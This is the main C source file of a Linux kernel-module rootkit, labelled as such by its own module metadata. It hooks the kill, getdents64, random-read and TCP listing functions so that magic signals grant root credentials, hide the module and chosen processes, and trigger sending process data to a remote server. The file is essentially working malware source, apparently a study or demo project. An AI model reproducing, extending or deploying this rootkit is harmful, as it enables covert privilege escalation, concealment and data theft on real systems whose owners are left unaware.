#include <linux/init.h>
#include <linux/dirent.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/version.h>
#include <linux/cred.h>
#include <linux/uidgid.h>
#include <linux/tcp.h>
#include <asm/current.h>

#include "networking.h"
#include "hooking.h"
#include "set_root.h"
#include "hide_process.h"
#include "hide_lkm.h"
#include "chardevices.h"
#include "hiding_ports.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("DANIEL KITA");
MODULE_DESCRIPTION("LKM ROOTKITS");
MODULE_VERSION("0.01");

#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4, 17, 0))
#define PTREGS 1
#endif
#ifdef PTREGS

kuid_t uid1, euid1, suid1, fsuid1, sruid;
kgid_t gid1, egid1, sgid1, fsgid1;

short hidden = 0;
char proc_pid[255];

//pointers to original functions
ssize_t (*orig_random_read)(struct file *file, char __user *buf, size_t nbytes,
			    loff_t *ppos);
ssize_t (*orig_urandom_read)(struct file *file, char __user *buf, size_t nbytes,
			     loff_t *ppos);
long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
long (*orig_tcp6_seq_show)(struct seq_file *seq, void *v);
long (*orig_getdents64)(const struct pt_regs *);
static long (*orig_kill)(const struct pt_regs *);

/*
hook to sys_kill for two different signals and several different pids.
if kill -64 1 - setting root privileges
if kill -64 2 - hiding kernel module
if kill -64 3 - sending processes data to server
kill -63 x - show process with PID: x
*/
long hook_kill(const struct pt_regs *regs)
{
	void set_root(void);
	void set_back(void);

	pid_t pid = regs->di;
	int sig = regs->si;

	if ((sig != 63) && (sig != 64))
		return orig_kill(regs);

	if ((sig == 63) && (pid > 0)) {
		printk(KERN_INFO "rootkit: proces %d is hidden\n", pid);
		sprintf(proc_pid, "%d", pid);
		return 0;
	}
	else if ((sig == 64) && (pid == 1)) {
		if (flag == 0 && (long int)uid1.val == (long int)sruid.val) {
			uid1 = current_uid();
			euid1 = current_euid();
			suid1 = current_suid();
			fsuid1 = current_fsuid();
			gid1 = current_gid();
			egid1 = current_egid();
			sgid1 = current_sgid();
			fsgid1 = current_fsgid();
			flag = 1;
		}
		if (amiroot == 0) {
			printk(KERN_INFO
			       "rootkit: giving root and changing amiroot to 1...\n");
			set_root();
			amiroot = 1;
			return 0;
		} else {
			printk(KERN_INFO
			       "rootkit: giving back user's creds and changing amiroot to 0...\n");
			set_back();
			amiroot = 0;
			return 0;
		}
	} else if ((sig == 64) && (pid == 2)) {
		if (hidden == 0) {
			printk(KERN_INFO
			       "rootkit: hiding rootkit kernel module...\n");
			hideme();
			hidden = 1;
			return 0;
		} else {
			printk(KERN_INFO
			       "rootkit: revealing rootkit kernel module...\n");
			showme();
			hidden = 0;
			return 0;
		}
	} else if ((sig == 64) && (pid == 3)) {
		my_tcp_sock_init();
		return 0;
	}
	return orig_kill(regs);
}
static struct fhook links[] = {
	HOOK("__x64_sys_kill", hook_kill, &orig_kill),
	HOOK("random_read", hook_random_read, &orig_random_read),
	HOOK("urandom_read", hook_urandom_read, &orig_urandom_read),
	HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
	HOOK("tcp4_seq_show", hook_tcp4_seq_show, &orig_tcp4_seq_show),
	HOOK("tcp6_seq_show", hook_tcp6_seq_show, &orig_tcp6_seq_show),
};

static int __init rootkit_init(void)
{
	int err;
	err = hooks_in(links, ARRAY_SIZE(links));
	if (err) {
		printk(KERN_INFO "rootkit: hooking failed\n");
		return err;
	}
	printk(KERN_INFO "rootkit: Loaded\n");

	return 0;
}

static void __exit rootkit_exit(void)
{
	hooks_out(links, ARRAY_SIZE(links));
	printk(KERN_INFO "rootkit: Unloaded\n");
}
module_init(rootkit_init);
module_exit(rootkit_exit);
#endif
